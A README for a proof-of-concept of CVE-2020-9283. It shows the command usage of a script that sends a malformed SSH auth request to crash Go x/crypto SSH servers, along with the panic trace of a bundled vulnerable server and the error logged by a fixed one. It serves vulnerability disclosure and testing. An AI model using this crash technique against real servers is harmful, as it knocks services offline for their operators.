# CVE-2020-9283

This contains a proof-of-concept for CVE-2020-9283 which allows a malicious user to cause a panic on an SSH
server running with golang.org/x/crypto before v0.0.0-20200220183623-bac4c82f6975.

The proof-of-concept can be found in `poc.py`. Running this script may crash the remote SSH server.

```
$ python poc.py
./poc.py <host> <port> <user>

$ python poc.py localhost 2022 root
Malformed auth request sent. This should cause a panic on the remote server.
```

An example vulnerable SSH server and an example fixed SSH server are also included. Go (golang)
is required to build the example servers.

```
$ cd target-vulnerable && go run main.go
2020/02/21 12:36:07 Vulnerable SSH server running on 0.0.0.0:2022
panic: ed25519: bad public key length: 21

goroutine 34 [running]:
crypto/ed25519.Verify(0xc0001407cf, 0x15, 0x2c, 0xc0000b2100, 0x88, 0x100, 0xc0001407f7, 0x0, 0x0, 0xc000104040)
        /usr/local/go/src/crypto/ed25519/ed25519.go:175 +0x458
golang.org/x/crypto/ed25519.Verify(...)
        /Users/madams/dev/go/src/golang.org/x/crypto/ed25519/ed25519_go113.go:72
golang.org/x/crypto/ssh.ed25519PublicKey.Verify(0xc0001407cf, 0x15, 0x2c, 0xc0000b2100, 0x88, 0x100, 0xc0000ec090, 0x28, 0x3f)
        /Users/madams/dev/go/src/golang.org/x/crypto/ssh/keys.go:578 +0x1a0
golang.org/x/crypto/ssh.(*connection).serverAuthenticate(0xc000100080, 0xc0000f8000, 0x11, 0x40, 0x0)
        /Users/madams/dev/go/src/golang.org/x/crypto/ssh/server.go:567 +0x1603
golang.org/x/crypto/ssh.(*connection).serverHandshake(0xc000100080, 0xc0000f8000, 0x1201123, 0x1a, 0x1384a00)
        /Users/madams/dev/go/src/golang.org/x/crypto/ssh/server.go:277 +0x59f
golang.org/x/crypto/ssh.NewServerConn(0x123a700, 0xc000010020, 0xc0000911e0, 0x0, 0x0, 0x0, 0x0, 0x0)
        /Users/madams/dev/go/src/golang.org/x/crypto/ssh/server.go:206 +0x17f
main.handleConnection(0x123a700, 0xc000010020, 0xc0000911e0)
        /Users/madams/dev/exploits/CVE-2020-9283/target-vulnerable/main.go:41 +0x5a
created by main.main
        /Users/madams/dev/exploits/CVE-2020-9283/target-vulnerable/main.go:91 +0x23d
exit status 2

$ cd target-fixed && go run main.go
2020/02/21 12:38:47 Fixed SSH server running on 0.0.0.0:2022
2020/02/21 12:38:51 failed to handshake: invalid size 21 for Ed25519 public key
```

